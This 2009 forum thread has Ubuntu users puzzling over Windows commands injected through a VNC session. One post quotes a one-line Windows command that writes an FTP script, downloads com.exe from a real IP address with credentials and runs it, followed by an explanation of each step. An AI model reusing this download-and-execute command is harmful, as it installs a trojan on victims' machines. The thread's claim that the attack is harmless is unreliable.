---
title: "Have I been hacked? If I have, he failed Miserably!!!"
date: 2009-07-12
forum: General Help
---

### Post by Colo2 on 2009-07-12
Hey everyone
I have ubuntu on my main desktop, and I was just getting dressed yesterday ready to go to work, when I heard "Beep" "Beep" "Beep" "Beep" "Beep" "Beep" "Beep" "Beep" "Beep" I looked over at my screen at the firefox search function (ctrl + f) was open and something, or someone was either typing or inputting code into it. I didn't take much detailed notice on what the code was, I noticed alot of "echo You got owned" and "cmd.exe" and other things and it kept repeating it.

Then eventually it stopped and the search function closed. 

Obviously, whatever it is, it was written for windows, but its running on my ubuntu machine. I am still concerned that i've been hacked or something. I did have vnc server open but it said that no one was connected.


If this virus/hack was written for windows, how could it run on ubuntu and even display that code? 

Thanks in advance :)

Tom

---

### Post by wirelessmonkey on 2009-07-12
VLC + weak password is the problem here... I highly suggest you turn off vlc, and if you must have it, generate a much bigger, better password for it.

---

### Post by Freezing on 2009-07-12
Check this:
System -> Preferences -> Remote Desktop
You can disable it entirely from there if you want by unchecking the top box.

lol its nothing to worry about. its just a batch file virus that some college kid made to mess with his friends but it got out of control and spread to other people. theres nothing malicious about it, it's just meant to pop up a message on your screen repeatedly.

check this aswell its kinda similar to the thing am talking about.
[http://forums.penny-arcade.com/showthread.php?t=75759](http://forums.penny-arcade.com/showthread.php?t=75759)

If am mistaking please correct me :)

---

### Post by Colo2 on 2009-07-12
Thank you for your reply, I dont NEED to use VNC, it just puzzled me that this VNC is used only within my network, i have NO ports forwarded/open for that PC.

:|

---

### Post by Colo2 on 2009-07-12
Reading around on that forum you linked me to:

> Ok, so I am minding my own business and the browser freezes (mind you, was on Google.com), and spotlight gets the following entered into it:

echo open 87.230.22.187/https/img/ 21 >> ik &echo user zf Z@z1humensk1 >> ik &echo binary >> ik &echo get com.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &com.exe &exitecho You got owned

> All that command line does is:

1) creates a file named "ik" containing the necessary commands to log into an FTP server and download a trojan
2) uses the "ik" file to log in and download the trojan
3) deletes the "ik" file
4) runs the trojan


Loooooks like that failed on the operating system =D

---

### Post by Frugoo Scape on 2009-07-12
Check the VLC logs and post the IP here, we can take care of him for you. No one messes with us ubuntu users.
(Joking about the IP part)

---

### Post by Colo2 on 2009-07-12
=D. I may be an idiot, but how do I check the VNC logs?

---

### Post by credobyte on 2009-07-12
Just a quick off-topic ( maybe on-topic ) question - why do you guys ask him to show [COLOR=Red]VLC[/COLOR] logs and things related to it ? He said VNC, not VLC ;)

Anyway, I would check my bash history ( simply open terminal and type in history as root and as a normal user - you'll see a list of commands used before/after this incident ) and system logs. It's not that easy to break into someones system without leaving a trace.

---

### Post by Colo2 on 2009-07-12
Thanks :D I think he was getting mixxed up between VLC and VNC, I knew what he meant tho :)

---

